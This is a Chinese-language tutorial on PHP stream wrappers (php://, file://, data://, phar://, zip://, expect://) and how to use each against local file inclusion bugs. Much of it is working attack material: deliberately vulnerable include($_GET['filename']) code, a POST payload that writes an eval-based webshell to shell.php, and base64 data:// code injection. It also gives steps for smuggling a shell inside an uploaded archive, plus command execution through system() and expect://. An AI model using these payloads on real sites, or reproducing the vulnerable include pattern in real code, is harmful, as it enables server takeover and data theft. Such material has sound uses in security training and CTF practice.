# PHP 伪协议

*PHP带有很多内置URL风格的封装协议，可用于fopen、copy、file_exsits 和 filesize等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自定义的封装协议。这些协议都被称为伪协议*

常见伪协议：
* file://	访问本地文件系统
* http://	访问http(s)网站
* ftp://	访问ftp(s)网站
* php://	访问各个输入输出流
* zlib://	处理压缩流
* data://	读取数据流
* glob://	查找匹配的文件路径模式
* phar://	PHP文档
* ssh2://	Secure Shell2
* rar://	RAR数据压缩
* ogg://	处理音频流
* expect://		处理交互的流

## php:// 伪协议
php伪协议是PHP提供的一些输入输出流访问功能，允许访问PHP的输入输出流，标准输入输出和错误描述符，内存中、磁盘备份的临时文件流，以及可以操作其他读取和写入文件资源的过滤器。

### php://filter
php://filter是元封装器，设计用于数据流打开时的筛选过滤应用，对本地磁盘文件进行读写
以下两种用法相同：
``?filename=php://filter/read=convert.base64-encoder/resource=xxx.php``
``?filename=php://filter/convert.base64-encoder/resource=xxx.php``

利用php://filter读取本地文件时不需要开启`allow_url_fopen`和`allow_url_include`

### php://input
php://input可以访问请求未经过解析的原始数据，但是使用 ``enctype = "multipart/form-data"``的时候 php://input是无效的。

php://input 有一下3种用法：

1. 读取POST数据

示例代码如下：
```
<?php 
	echo file_get_contents("php://input")
?>
```

2. 写入木马

需要开启`allow_url_include`不需要开启`allow_url_fopen`
如果POST传入的数据是PHP代码，就可以写入木马，示例代码：
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

通过POST传入恶意代码：
``<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST['cmd'])?>');?>``

php://input执行代码并在当前目录生成shell.php

3. 执行命令
需要开启`allow_url_include`不需要开启`allow_url_fopen`。如果POST传入的数据是PHP代码，就可以执行任意代码，如果此时PHP代码调用了系统函数就可以执行系统命令。
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

通过POST传入恶意代码：  
`<?php system('whoami');?>`

## file:// 伪协议
file:// 伪协议可以访问本地文件系统，读取文件内容，读取本地文件时不需要开启`allow_url_fopen`和`allow_url_include`，示例代码：
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

输入以下URL：
``?filename=file://c:/boot.ini``

## data:// 伪协议
从PHP 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取。如果传入的是php代码，就会执行任意代码,需要开启`allow_url_fopen`和`allow_url_include`。
示例代码：
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

利用方法：
``data://text/plain;base64,XXXXXXXXXXXX(base64编码数据)``

``?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b``

## phar:// 伪协议
phar:// 是用来解压的伪协议，不管参数中的文件扩展名是什么都会被当中压缩包。
利用时PHP版本应高于5.3.0，需要开启`allow_url_fopen`和`allow_url_include`
示例代码：
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

利用方法：
```
?file=phar://压缩包/内部文件
?file=phar://xxx.png/shell.php
```

利用步骤：
通常用在有上传功能的网站中，写一个shell.php，然后使用zip://伪协议压缩伪shell.zip，再修改扩展名为.php，上传网站。

**注意：** 压缩包需要使用zip://伪协议，而不能使用rar:// 伪协议压缩。将木马文件压缩后，改为任意格式文件都可以正常使用。

## zip:// 伪协议
zip:// 伪协议在原理上类似 phar:// 伪协议，但用法不一样。利用时PHP版本应高于5.3.0，需要开启`allow_url_fopen`和`allow_url_include`
示例代码：
```
<?php
	$filename=$_GET['filename'];
	include($filename);
?>
```

利用方法：
```
?file=zip://[压缩包文件绝对路径]＃[内部文件内的子文件名]
?file=zip://xxx.png＃shell.php
```

## expect:// 伪协议
expect:// 伪协议主要用来执行系统命令，但是需要安装扩展。
用法如下：
``?file=expect://ls``